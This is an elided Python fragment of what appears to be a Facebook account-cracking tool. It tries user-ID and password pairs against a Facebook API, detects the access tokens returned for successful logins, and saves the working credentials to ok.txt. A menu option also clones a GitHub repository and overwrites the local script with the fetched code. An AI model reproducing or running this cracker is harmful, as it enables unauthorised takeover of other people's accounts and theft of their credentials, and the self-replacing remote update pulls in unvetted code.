...
def log_sel():
	...
	if sel == "":
		...
		subprocess.check_output(["am", "start", "https://www.facebook.com/masood.khan009])
		main()
	elif sel =="3" or sel =="03":
		import os
		try:
			os.system("git clone https://github.com/Nazirokhanx450/fcprotOr6.git")
			os.system("rm -rf fcprotOr6.py")
			os.system("cp -f fcprotOr6/fcprotOr6.py \\.")
			os.system("rm -rf fcprotOr6")
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in data.text and "EAAA" in data.text:
				print(" \033[1;32m[TOr-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				...
				if "www.facebook.com" in data.json()['error_msg']:
					...
					data = requests.get(api, params=params, headers=headers_)
					if "access_token" in data.text and "EAAA" in data.text:
						print(" \033[1;32m[TOR-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
